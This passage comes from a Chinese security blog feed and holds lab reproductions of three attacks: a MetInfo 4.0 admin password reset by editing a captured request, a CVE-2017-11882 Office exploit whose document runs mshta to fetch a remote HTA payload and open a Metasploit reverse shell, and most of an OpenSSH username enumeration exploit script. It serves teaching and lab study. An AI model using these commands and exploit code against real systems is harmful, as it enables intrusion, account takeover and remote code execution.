<p>实例<br>他就是我们的参数</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">                                </span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;#&quot;</span> <span class="attr">method</span>=<span class="string">&quot;get&quot;</span> &gt;</span></span><br><span class="line">                            <span class="comment">&lt;!--主要代码在这里--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>  <span class="attr">name</span>=<span class="string">&quot;user&quot;</span> /&gt;</span> <span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">                            <span class="comment">&lt;!--主要代码在这里--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span>  <span class="attr">name</span>=<span class="string">&quot;passwd&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201126091712.png"></p>
<h2 id="lt-select-gt-选项组和-lt-option-gt-下拉列表中的选项"><a href="#lt-select-gt-选项组和-lt-option-gt-下拉列表中的选项" class="headerlink" title="&lt;select&gt;选项组和&lt;option&gt;下拉列表中的选项"></a><code>&lt;select&gt;</code>选项组和<code>&lt;option&gt;</code>下拉列表中的选项</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--主要代码在这里--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">select</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span>&gt;</span>www.baidu.com<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span>&gt;</span>bing.com<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">option</span>&gt;</span>kali.org<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>实咧<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201125160136.png"></p>
<h2 id="lt-textarea-gt-文本域"><a href="#lt-textarea-gt-文本域" class="headerlink" title="&lt;textarea&gt; 文本域"></a><code>&lt;textarea&gt;</code> 文本域</h2><p>实咧</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf-8&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--主要代码在这里--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">cols</span>=<span class="string">&quot;30&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;30&quot;</span> &gt;</span>默认字<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201125161537.png"></p>
]]></content>
      <categories>
        <category>编程</category>
        <category>HTML</category>
      </categories>
      <tags>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title>MetInfo4.0任意用户密码修改漏洞复现</title>
    <url>/2020/12/16/MetInfo4.0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="参数环境"><a href="#参数环境" class="headerlink" title="参数环境"></a>参数环境</h2><p>服务器windows2003，服务器软件phpstudy2018,   MetInfo4.0版本<br>攻击者kal linux </p>
<h2 id="实验环境搭建"><a href="#实验环境搭建" class="headerlink" title="实验环境搭建"></a>实验环境搭建</h2><p>MetInfo4.0版本下载地址<a href="https://www.metinfo.cn/upload/file/update/MetInfo4.0.zip">https://www.metinfo.cn/upload/file/update/MetInfo4.0.zip</a><br>phpstudy2018现在地址<a href="http://public.xp.cn/upgrades/PhpStudy2018.zip">http://public.xp.cn/upgrades/PhpStudy2018.zip</a></p>
<p>叫下载好的MetInfo4.0版本解压出来<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201216111155.png"></p>
<p>访问这个地址<code>http://ip/MetInfo/</code><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201216111349.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201216111456.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201216111637.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201216111657.png"><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201216111746.png"></p>
<p>这样就安装好了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201216111809.png"></p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>我们先注册一个会员</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201216111916.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201216111953.png"></p>
<p>进行注册</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201216112036.png"></p>
<p>我们登录一下<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201216112110.png"></p>
<p>我们进行修改密码<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201216112319.png"></p>
<p>用Burp抓包<br>可以看见这个是我们要修改的用户名<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201216112550.png"></p>
<p>我们改成管理员的admin用户<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201216112633.png"></p>
<p>可以看见修改成功<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201216112650.png"></p>
<p>我们进入管理员页面<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201216112907.png"></p>
<p>abc用设置的abc的密码登录<br>发现登录进入了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201216113009.png"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Office漏洞复现CVE-2017-11882</title>
    <url>/2020/12/12/Office%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0CVE-2017-11882/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>CVE-2017-11882属于缓冲区溢出类型漏洞，产生漏洞原因于EQNEDT32.EXE（微软office自带公式编辑器）进程在读入包含MathType的ole数据时，在拷贝公式字体名称（Font Name数据）时没有对名称长度进行校验，导致缓冲区溢出。通过覆盖函数的返回地址，可执行任意代码。</p>
<p>2017年11月14日，微软发布了11月份的安全补丁更新，影响流行的所有Office版本</p>
<table>
<thead>
<tr>
<th align="center">事件属性名</th>
<th align="right">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">漏洞ID</td>
<td align="right">CVE-2017-11882</td>
</tr>
<tr>
<td align="center">漏洞名称</td>
<td align="right">Microsoft Office数学公式编辑器内存损坏漏洞</td>
</tr>
<tr>
<td align="center">漏洞类型</td>
<td align="right">远程代码执行</td>
</tr>
<tr>
<td align="center">威胁类型</td>
<td align="right">栈溢出</td>
</tr>
<tr>
<td align="center">影响版本</td>
<td align="right">Microsoft Office 2000/2003/2007sp3/2010sp2/2013sp1/2016</td>
</tr>
</tbody></table>
<h2 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h2><p><strong>攻击：kali  IP：192.168.31.14</strong><br><strong>受害者：windows7  IP：192.168.31.55   Microsoft Office2016版本</strong><br><strong>漏洞文件生成<code>https://github.com/Ridter/CVE-2017-11882</code></strong></p>
<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>下载地址<a href="https://github.com/Ridter/CVE-2017-11882">https://github.com/Ridter/CVE-2017-11882</a><br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;Ridter&#x2F;CVE-2017-11882</span><br></pre></td></tr></table></figure>
<h2 id="生成漏洞文件"><a href="#生成漏洞文件" class="headerlink" title="生成漏洞文件"></a>生成漏洞文件</h2><p>进入目录<code>cd CVE-2017-11882</code><br>下面生成的文件受害者就会执行是计算器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python Command_CVE-2017-11882.py -c &quot;cmd.exe &#x2F;c calc.exe&quot; -o test.doc</span><br></pre></td></tr></table></figure>
<h3 id="执行命令启动计算器"><a href="#执行命令启动计算器" class="headerlink" title="执行命令启动计算器"></a>执行命令启动计算器</h3><p>可以看见生成了一个<code>test.doc</code>的文件<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201212115236.png"><br>在目标windows7打开就启动计算器<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201212115424.png"></p>
<h3 id="EXP-生成"><a href="#EXP-生成" class="headerlink" title="EXP 生成"></a>EXP 生成</h3><p><strong>hta 是 HTML 应用程序，大多数的 Windows 操作系统都支持 hta 文件执行，利用 mshta.exe 解析 .hta文件执行，这里的 .hta 文件可以是本地的也可以是可访问的远程主机上的</strong></p>
<p>模块：<code>use exploit/windows/misc/hta_server</code><br>木马模块：<code>set payload windows/meterpreter/reverse_tcp</code></p>
<ul>
<li>应为他默认就是用的<code>windows/meterpreter/reverse_tcp</code>模块</li>
</ul>
<p>指定web地址：set SRVHOST <code>kali的IP</code><br>指定web端口：set SRVPORT 指定的端口<br>指定地址：set RHOST <code>kali的IP</code><br>指定监听端口：set LPORT 监听端口<br>运行：exploit -j #-j是隐藏连接的意思<br>运行结果<br>可以看见地址是<code>http://192.168.31.14:8090/bblVmviVL2gVIES.hta</code><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201212152722.png"></p>
<p><strong>EXP 生成</strong><br>下面地址就添加上面打开的web地址</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python Command109b_CVE-2017-11882.py -c &quot;mshta http:&#x2F;&#x2F;192.168.31.14:8090&#x2F;bblVmviVL2gVIES.hta&quot; -o test.doc</span><br></pre></td></tr></table></figure>
<p>他会生成一个<code>test.doc</code><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201212153029.png"></p>
<p>拿到win7系统打开<code>test.doc</code>一个shell就得到了</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201212153312.png"><br><strong>查看<code>shell</code>的<code>id</code></strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sessions -l</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201212153645.png"><br><strong>进入shell</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sessions -i 1</span><br></pre></td></tr></table></figure>
<p>进入shell后就可以你想操作的了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201212153736.png"></p>
<h2 id="参考地址"><a href="#参考地址" class="headerlink" title="参考地址"></a>参考地址</h2><p><a href="https://www.sqlsec.com/2020/10/office.html">国光</a><br><a href="https://www.freebuf.com/articles/web/183551.html">https://www.freebuf.com/articles/web/183551.html</a></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>OpenSSH 漏洞复现用户名枚举漏洞(CVE-2018-15473)</title>
    <url>/2020/09/28/OpenSSH%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E7%94%A8%E6%88%B7%E5%90%8D%E6%9E%9A%E4%B8%BE%E6%BC%8F%E6%B4%9E(CVE-2018-15473)/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="OpenSSH-用户名枚举漏洞（CVE-2018-15473）"><a href="#OpenSSH-用户名枚举漏洞（CVE-2018-15473）" class="headerlink" title="OpenSSH 用户名枚举漏洞（CVE-2018-15473）"></a>OpenSSH 用户名枚举漏洞（CVE-2018-15473）</h2><p>OpenSSH 7.7前存在一个用户名枚举漏洞，通过该漏洞，攻击者可以判断某个用户名是否存在于目标主机中。</p>
<p>参考链接：<br>· <a href="http://openwall.com/lists/oss-security/2018/08/15/5">http://openwall.com/lists/oss-security/2018/08/15/5</a><br>· <a href="https://github.com/Rhynorater/CVE-2018-15473-Exploit">https://github.com/Rhynorater/CVE-2018-15473-Exploit</a><br>· <a href="https://www.anquanke.com/post/id/157607">https://www.anquanke.com/post/id/157607</a></p>
<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><p>靶场metasploitable-linux-2.0.0</p>
<p>依赖的<code>paramiko</code>下载</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip3 install &quot;paramiko &#x3D;&#x3D; 2.0.8&quot;</span><br></pre></td></tr></table></figure>
<p>直接下载<br><a href="https://github.com/Rhynorater/CVE-2018-15473-Exploit">https://github.com/Rhynorater/CVE-2018-15473-Exploit</a></p>
<p>或者复制下面的代码<br>下面的代码保存为<code>sshUsernameEnumExploit.py</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">###########################################################################</span></span><br><span class="line"><span class="comment">#                ____                    _____ _____ _    _               #</span></span><br><span class="line"><span class="comment">#               / __ \                  / ____/ ____| |  | |              #</span></span><br><span class="line"><span class="comment">#              | |  | |_ __   ___ _ __ | (___| (___ | |__| |              #</span></span><br><span class="line"><span class="comment">#              | |  | | &#x27;_ \ / _ \ &#x27;_ \ \___ \\___ \|  __  |              #</span></span><br><span class="line"><span class="comment">#              | |__| | |_) |  __/ | | |____) |___) | |  | |              #</span></span><br><span class="line"><span class="comment">#               \____/| .__/ \___|_| |_|_____/_____/|_|  |_|              #</span></span><br><span class="line"><span class="comment">#                     | |               Username Enumeration              #</span></span><br><span class="line"><span class="comment">#                     |_|                                                 #</span></span><br><span class="line"><span class="comment">#                                                                         #</span></span><br><span class="line"><span class="comment">###########################################################################</span></span><br><span class="line"><span class="comment"># Exploit: OpenSSH Username Enumeration Exploit (CVE-2018-15473)          #</span></span><br><span class="line"><span class="comment"># Vulnerability: CVE-2018-15473                                           #</span></span><br><span class="line"><span class="comment"># Affected Versions: OpenSSH version &lt; 7.7                                #</span></span><br><span class="line"><span class="comment"># Author: Justin Gardner, Penetration Tester @ SynerComm AssureIT         #</span></span><br><span class="line"><span class="comment"># Github: https://github.com/Rhynorater/CVE-2018-15473-Exploit            #</span></span><br><span class="line"><span class="comment"># Email: Justin.Gardner@SynerComm.com                                     #</span></span><br><span class="line"><span class="comment"># Date: August 20, 2018                                                   #</span></span><br><span class="line"><span class="comment">###########################################################################</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint <span class="keyword">as</span> rand</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice <span class="keyword">as</span> choice</span><br><span class="line"><span class="comment"># store function we will overwrite to malform the packet</span></span><br><span class="line">old_parse_service_accept = paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT]</span><br><span class="line"></span><br><span class="line"><span class="comment"># list to store 3 random usernames (all ascii_lowercase characters); this extra step is added to check the target</span></span><br><span class="line"><span class="comment"># with these 3 random usernames (there is an almost 0 possibility that they can be real ones)</span></span><br><span class="line">random_username_list = []</span><br><span class="line"><span class="comment"># populate the list</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">    user = <span class="string">&quot;&quot;</span>.join(choice(string.ascii_lowercase) <span class="keyword">for</span> x <span class="keyword">in</span> range(rand(<span class="number">15</span>, <span class="number">20</span>)))</span><br><span class="line">    random_username_list.append(user)</span><br><span class="line"></span><br><span class="line"><span class="comment"># create custom exception</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BadUsername</span>(<span class="params">Exception</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># create malicious &quot;add_boolean&quot; function to malform packet</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_boolean</span>(<span class="params">*args, **kwargs</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># create function to call when username was invalid</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">call_error</span>(<span class="params">*args, **kwargs</span>):</span></span><br><span class="line">    <span class="keyword">raise</span> BadUsername()</span><br><span class="line"></span><br><span class="line"><span class="comment"># create the malicious function to overwrite MSG_SERVICE_ACCEPT handler</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">malform_packet</span>(<span class="params">*args, **kwargs</span>):</span></span><br><span class="line">    old_add_boolean = paramiko.message.Message.add_boolean</span><br><span class="line">    paramiko.message.Message.add_boolean = add_boolean</span><br><span class="line">    result  = old_parse_service_accept(*args, **kwargs)</span><br><span class="line">    <span class="comment">#return old add_boolean function so start_client will work again</span></span><br><span class="line">    paramiko.message.Message.add_boolean = old_add_boolean</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment"># create function to perform authentication with malformed packet and desired username</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkUsername</span>(<span class="params">username, tried=<span class="number">0</span></span>):</span></span><br><span class="line">    sock = socket.socket()</span><br><span class="line">    sock.connect((args.hostname, args.port))</span><br><span class="line">    <span class="comment"># instantiate transport</span></span><br><span class="line">    transport = paramiko.transport.Transport(sock)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        transport.start_client()</span><br><span class="line">    <span class="keyword">except</span> paramiko.ssh_exception.SSHException:</span><br><span class="line">        <span class="comment"># server was likely flooded, retry up to 3 times</span></span><br><span class="line">        transport.close()</span><br><span class="line">        <span class="keyword">if</span> tried &lt; <span class="number">4</span>:</span><br><span class="line">            tried += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> checkUsername(username, tried)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&#x27;[-] Failed to negotiate SSH transport&#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        transport.auth_publickey(username, paramiko.RSAKey.generate(<span class="number">1024</span>))</span><br><span class="line">    <span class="keyword">except</span> BadUsername:</span><br><span class="line">            <span class="keyword">return</span> (username, <span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">except</span> paramiko.ssh_exception.AuthenticationException:</span><br><span class="line">            <span class="keyword">return</span> (username, <span class="literal">True</span>)</span><br><span class="line">    <span class="comment">#Successful auth(?)</span></span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&quot;There was an error. Is this the correct version of OpenSSH?&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># function to test target system using the randomly generated usernames</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkVulnerable</span>():</span></span><br><span class="line">    vulnerable = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> user <span class="keyword">in</span> random_username_list:</span><br><span class="line">        result = checkUsername(user)</span><br><span class="line">        <span class="keyword">if</span> result[<span class="number">1</span>]:</span><br><span class="line">            vulnerable = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> vulnerable</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exportJSON</span>(<span class="params">results</span>):</span></span><br><span class="line">    data = &#123;<span class="string">&quot;Valid&quot;</span>:[], <span class="string">&quot;Invalid&quot;</span>:[]&#125;</span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">        <span class="keyword">if</span> result[<span class="number">1</span>] <span class="keyword">and</span> result[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> data[<span class="string">&#x27;Valid&#x27;</span>]:</span><br><span class="line">            data[<span class="string">&#x27;Valid&#x27;</span>].append(result[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> result[<span class="number">1</span>] <span class="keyword">and</span> result[<span class="number">0</span>] <span class="keyword">not</span> <span class="keyword">in</span> data[<span class="string">&#x27;Invalid&#x27;</span>]:</span><br><span class="line">            data[<span class="string">&#x27;Invalid&#x27;</span>].append(result[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">return</span> json.dumps(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exportCSV</span>(<span class="params">results</span>):</span></span><br><span class="line">    final = <span class="string">&quot;Username, Valid\n&quot;</span></span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">        final += result[<span class="number">0</span>]+<span class="string">&quot;, &quot;</span>+str(result[<span class="number">1</span>])+<span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="keyword">return</span> final</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exportList</span>(<span class="params">results</span>):</span></span><br><span class="line">    final = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> result <span class="keyword">in</span> results:</span><br><span class="line">        <span class="keyword">if</span> result[<span class="number">1</span>]:</span><br><span class="line">            final+=result[<span class="number">0</span>]+<span class="string">&quot; is a valid user!\n&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            final+=result[<span class="number">0</span>]+<span class="string">&quot; is not a valid user!\n&quot;</span></span><br><span class="line">    <span class="keyword">return</span> final</span><br><span class="line"></span><br><span class="line"><span class="comment"># assign functions to respective handlers</span></span><br><span class="line">paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_SERVICE_ACCEPT] = malform_packet</span><br><span class="line">paramiko.auth_handler.AuthHandler._handler_table[paramiko.common.MSG_USERAUTH_FAILURE] = call_error</span><br><span class="line"></span><br><span class="line"><span class="comment"># get rid of paramiko logging</span></span><br><span class="line">logging.getLogger(<span class="string">&#x27;paramiko.transport&#x27;</span>).addHandler(logging.NullHandler())</span><br><span class="line"></span><br><span class="line">arg_parser = argparse.ArgumentParser()</span><br><span class="line">arg_parser.add_argument(<span class="string">&#x27;hostname&#x27;</span>, type=str, help=<span class="string">&quot;The target hostname or ip address&quot;</span>)</span><br><span class="line">arg_parser.add_argument(<span class="string">&#x27;--port&#x27;</span>, type=int, default=<span class="number">22</span>, help=<span class="string">&quot;The target port&quot;</span>)</span><br><span class="line">arg_parser.add_argument(<span class="string">&#x27;--threads&#x27;</span>, type=int, default=<span class="number">5</span>, help=<span class="string">&quot;The number of threads to be used&quot;</span>)</span><br><span class="line">arg_parser.add_argument(<span class="string">&#x27;--outputFile&#x27;</span>, type=str, help=<span class="string">&quot;The output file location&quot;</span>)</span><br><span class="line">arg_parser.add_argument(<span class="string">&#x27;--outputFormat&#x27;</span>, choices=[<span class="string">&#x27;list&#x27;</span>, <span class="string">&#x27;json&#x27;</span>, <span class="string">&#x27;csv&#x27;</span>], default=<span class="string">&#x27;list&#x27;</span>, type=str, help=<span class="string">&quot;The output file location&quot;</span>)</span><br><span class="line">group = arg_parser.add_mutually_exclusive_group(required=<span class="literal">True</span>)</span><br><span class="line">group.add_argument(<span class="string">&#x27;--username&#x27;</span>, type=str, help=<span class="string">&quot;The single username to validate&quot;</span>)</span><br><span class="line">group.add_argument(<span class="string">&#x27;--userList&#x27;</span>, type=str, help=<span class="string">&quot;The list of usernames (one per line) to enumerate through&quot;</span>)</span><br><span class="line">args = arg_parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    sock = socket.socket()</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sock.connect((args.hostname, args.port))</span><br><span class="line">        sock.close()</span><br><span class="line">    <span class="keyword">except</span> socket.error:</span><br><span class="line">        print(<span class="string">&#x27;[-] Connecting to host failed. Please check the specified host and port.&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># first we run the function to check if host is vulnerable to this CVE</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> checkVulnerable():</span><br><span class="line">        <span class="comment"># most probably the target host is either patched or running a version not affected by this CVE</span></span><br><span class="line">        print(<span class="string">&quot;Target host most probably is not vulnerable or already patched, exiting...&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">elif</span> args.username: <span class="comment">#single username passed in</span></span><br><span class="line">        result = checkUsername(args.username)</span><br><span class="line">        <span class="keyword">if</span> result[<span class="number">1</span>]:</span><br><span class="line">            print(result[<span class="number">0</span>]+<span class="string">&quot; is a valid user!&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(result[<span class="number">0</span>]+<span class="string">&quot; is not a valid user!&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> args.userList: <span class="comment">#username list passed in</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            f = open(args.userList)</span><br><span class="line">        <span class="keyword">except</span> IOError:</span><br><span class="line">            print(<span class="string">&quot;[-] File doesn&#x27;t exist or is unreadable.&quot;</span>)</span><br><span class="line">            sys.exit(<span class="number">3</span>)</span><br><span class="line">        usernames = map(str.strip, 